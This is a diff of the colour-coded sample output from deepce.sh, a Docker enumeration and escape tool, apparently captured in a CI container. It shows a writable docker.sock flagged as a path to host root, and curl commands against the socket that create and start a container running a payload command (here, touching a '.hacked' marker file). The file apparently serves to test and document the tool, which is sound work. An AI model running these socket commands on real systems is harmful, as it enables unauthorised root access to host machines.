@@ -73,7 +73,6 @@ OK: 34 MiB in 42 packages
 [1;33m[+][1;32m Docker Executable ....... [0m[1;90mNot Found[0m
 [1;33m[+][1;32m Docker Sock ............. [0m[1;33mYes[0m
 [1;37msrw-rw----    1 root     121            0 Apr 28 19:03 /var/run/docker.sock[0m
-
 [1;33m[+][1;32m Sock is writable ........ [0m[48;5;1mYes[0m
 [1;90mThe docker sock is writable, we should be able to enumerate docker, create containers 
 and obtain root privs on the host machine
@@ -89,14 +88,14 @@ OSType:linux
 Architecture:x86_64
 NCPU:2
 DockerRootDir:/var/lib/docker
-Name:fv-az90-102
+Name:fv-az93-846
 ServerVersion:20.10.6+azure[0m
-[1;33m[+][1;32m Docker Exploits ......... [0m[1;33m20.10.6+azure[0m
+[1;33m[+][1;32m Docker Version .......... [0m[1;33m20.10.6+azure[0m
 [1;33m[+][1;32m CVE–2019–13139 .......... [0m[1;90mNo[0m
 [1;33m[+][1;32m CVE–2019–5736 ........... [0m[1;90mNo[0m
 [1;34m==================================[1;32m( Enumerating Container )[1;34m===================================[0m
-[1;33m[+][1;32m Container ID ............ [0m[1;33ma5734572d95d[0m
-[1;33m[+][1;32m Container Full ID ....... [0m[1;33ma5734572d95d7fd7d34f615008dda18e6324e6b409247073a1350dd1d53b10c2[0m
+[1;33m[+][1;32m Container ID ............ [0m[1;33m003dd789d7a1[0m
+[1;33m[+][1;32m Container Full ID ....... [0m[1;33m003dd789d7a158768c12d189c396a482a545a6f57d48ebd5a3f08f739e810152[0m
 [1;33m[+][1;32m Container Name .......... [0m[1;31mCould not get container name through reverse DNS[0m
 [1;33m[+][1;32m Container IP ............ [0m[1;33m172.17.0.2[0m
 [1;33m[+][1;32m DNS Server(s) ........... [0m[1;33m168.63.129.16 [0m
@@ -104,7 +103,7 @@ ServerVersion:20.10.6+azure[0m
 [1;33m[+][1;32m Operating System ........ [0m[1;90mLinux[0m
 [1;33m[+][1;32m Kernel .................. [0m[1;90m5.4.0-1046-azure[0m
 [1;33m[+][1;32m Arch .................... [0m[1;90mx86_64[0m
-[1;33m[+][1;32m CPU ..................... [0m[1;90mIntel(R) Xeon(R) CPU E5-2673 v3 @ 2.40GHz[0m
+[1;33m[+][1;32m CPU ..................... [0m[1;90mIntel(R) Xeon(R) Platinum 8171M CPU @ 2.60GHz[0m
 [1;33m[+][1;32m Useful tools installed .. [0m[1;33mYes[0m
 [1;90m/usr/bin/curl
 /usr/bin/wget
@@ -134,12 +133,12 @@ See [4mhttps://stealthcopter.github.io/deepce/guides/docker-sock.md[0m[0m
 [1;34m====================================[1;32m( Interesting Files )[1;34m=====================================[0m
 [1;33m[+][1;32m Interesting environment variables ... [0m[1;90mNo[0m
 [1;90mHOME=/root
-HOSTNAME=a5734572d95d
+HOSTNAME=003dd789d7a1
 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 PWD=/
 SHLVL=1[0m
 [1;33m[+][1;32m Any common entrypoint files ......... [0m[1;33mYes[0m
-[1;90m-rwxr-xr-x    1 1001     121        34.0K Apr 28 19:09 /root/deepce.sh[0m
+[1;90m-rwxr-xr-x    1 1001     121        34.4K Apr 28 19:10 /root/deepce.sh[0m
 [1;33m[+][1;32m Interesting files in root ........... [0m[1;90mNo[0m
 [1;33m[+][1;32m Passwords in common files ........... [0m[1;90mNo[0m
 [1;33m[+][1;32m Home directories .................... [0m[1;90mNo[0m
@@ -157,13 +156,13 @@ host machine, this can be used to enumerate further[0m
 [1;33m[+][1;32m Custom Command ........... [0m[1;90mtouch /tmp/deepce-docker-alpine-payload-command.hacked[0m
 [1;33m[+][1;32m Clean up ................. [0m[1;90mAutomatic on container exit[0m
 
-[1;33m[+][1;32m Creating container ..... [0m[1;33m63b90e9c81b97b2ec5962823b6dad12da2d7967bfc56960faef23c69a25bebe7[0m
+[1;33m[+][1;32m Creating container ..... [0m[1;33mba7b031490e260fe25ba2946e4698719ce4b48ca9ce0670f10a1dc5299b46c0e[0m
 [1;33m[+][1;32m If the shell dies you can restart your listener and run the start command to fire it again [0m
-[1;90mStart Command: curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/63b90e9c81b97b2ec5962823b6dad12da2d7967bfc56960faef23c69a25bebe7/start[0m
-[1;90mLogs Command: curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/63b90e9c81b97b2ec5962823b6dad12da2d7967bfc56960faef23c69a25bebe7/logs?stderr=1&stdout=1" --output -[0m
+[1;90mStart Command: curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/ba7b031490e260fe25ba2946e4698719ce4b48ca9ce0670f10a1dc5299b46c0e/start[0m
+[1;90mLogs Command: curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/ba7b031490e260fe25ba2946e4698719ce4b48ca9ce0670f10a1dc5299b46c0e/logs?stderr=1&stdout=1" --output -[0m
 [1;33m[+][1;32m Once complete remember to tidy up by stopping and removing your container with following commands [0m
-[1;90mStop Command: curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/63b90e9c81b97b2ec5962823b6dad12da2d7967bfc56960faef23c69a25bebe7/stop[0m
-[1;90mRemove Command: curl -s -XDELETE --unix-socket /var/run/docker.sock http://localhost/containers/63b90e9c81b97b2ec5962823b6dad12da2d7967bfc56960faef23c69a25bebe7[0m
+[1;90mStop Command: curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/ba7b031490e260fe25ba2946e4698719ce4b48ca9ce0670f10a1dc5299b46c0e/stop[0m
+[1;90mRemove Command: curl -s -XDELETE --unix-socket /var/run/docker.sock http://localhost/containers/ba7b031490e260fe25ba2946e4698719ce4b48ca9ce0670f10a1dc5299b46c0e[0m
 [1;33m[+][1;32m Starting container ..... [0m[1;33mSuccess[0m
 [1;33m[+][1;32m Sleeping for ........... [0m[1;90m2s[0m
 [1;33m[+][1;32m Fetching logs .......... [0m[1;33mSuccess[0m
